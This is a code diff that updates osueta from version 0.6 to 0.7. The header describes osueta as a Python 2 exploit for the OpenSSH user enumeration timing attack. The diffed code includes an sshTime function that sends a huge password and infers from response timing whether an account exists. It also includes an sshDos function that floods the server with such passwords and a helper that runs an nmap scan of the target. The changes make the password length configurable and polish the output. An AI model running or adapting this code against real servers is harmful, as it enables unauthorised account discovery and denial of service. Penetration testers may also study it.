@@ -3,7 +3,7 @@
 __license__="""
 osueta (OpenSSH User Enumeration Timing Attack)
 
-Version 0.6
+Version 0.7
 
 A simple Python2 script to exploit the OpenSSH User Enumeration Timing Attack:
 
@@ -49,8 +49,9 @@ from threading import *
 
 screenLock = Semaphore(value=1)
 
-def sshTime(host,port,user,sock,defTime):
-	print 'Connecting %s@%s:%d ' % (user,host,int(port))
+def sshTime(host,port,user,sock,defTime,length):
+	print 
+	print '[+] Connecting %s@%s:%d ... ' % (user,host,int(port))
 
 	try:
 		sock.connect((host,int(port)))
@@ -58,37 +59,40 @@ def sshTime(host,port,user,sock,defTime):
 		para.local_version="SSH-2.0-Blabla"
 
 	except paramiko.SSHException: 
-		print "Unable to connect to host"
+		print "[-] Unable to connect to host"
+		return  
+        except socket.error: 
+		print "[-] Unable to connect to host"
 		return  
     
 	try:
 		para.connect(username=user)
 
 	except EOFError,e:
-		print 'Error: %s' % e
+		print '[-] Error: %s' % e
 		return  
 
 	except paramiko.SSHException,e:
-        	print 'Error: %s' % e
+        	print '[-] Error: %s' % e
         	return   
 
-    	passwd = 'A'*39000
+    	passwd = 'A'*length
 
 	timeStart = int(time.time())
 
 	try:
 		para.auth_password(user,passwd)
 	except paramiko.AuthenticationException,e:
-		print e
+		print '[-] '+ str(e)
 	except paramiko.SSHException,e:
-		print e
+		print '[-] '+ str(e)
 
 	timeDone = int(time.time())
 
 	timeRes = timeDone-timeStart
 
 	if timeRes > defTime:
-		print 'User: %s exists' % user
+		print '[+] User: %s exists' % user
         	ret = user,host,port,timeRes
 
 	else:
@@ -96,7 +100,7 @@ def sshTime(host,port,user,sock,defTime):
 	para.close()
 	return ret
 
-def sshDos(host,port,user,sock,defTime):
+def sshDos(host,port,user,sock,length):
 
 	try:
 		sock.connect((host,int(port)))
@@ -104,7 +108,7 @@ def sshDos(host,port,user,sock,defTime):
 		para.local_version="SSH-2.0-Blabla"
 
 	except paramiko.SSHException: 
-		print "Unable to connect to host"
+		print "[-] Unable to connect to host"
 		exit(1)   
     
 	try:
@@ -116,7 +120,7 @@ def sshDos(host,port,user,sock,defTime):
 	except paramiko.SSHException,e:
         	exit(1)   
 
-    	passwd = 'A'*39000
+    	passwd = 'A'*length
 
 	try:
 		para.auth_password(user,passwd)
@@ -133,7 +137,7 @@ def prevScann(host,port):
 	try:
 		scanp = subprocess.Popen(["nmap","-T5","-n","-PN",nport,host],stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
 	except OSError:
-        	print "Install masscan: sudo apt-get install masscan"  
+        	print "[-] Install nmap: sudo apt-get install nmap"  
 	scanhost = scanp.split()
 	if 'open' in scanhost:
 		print 'port ' + port + ' open.'
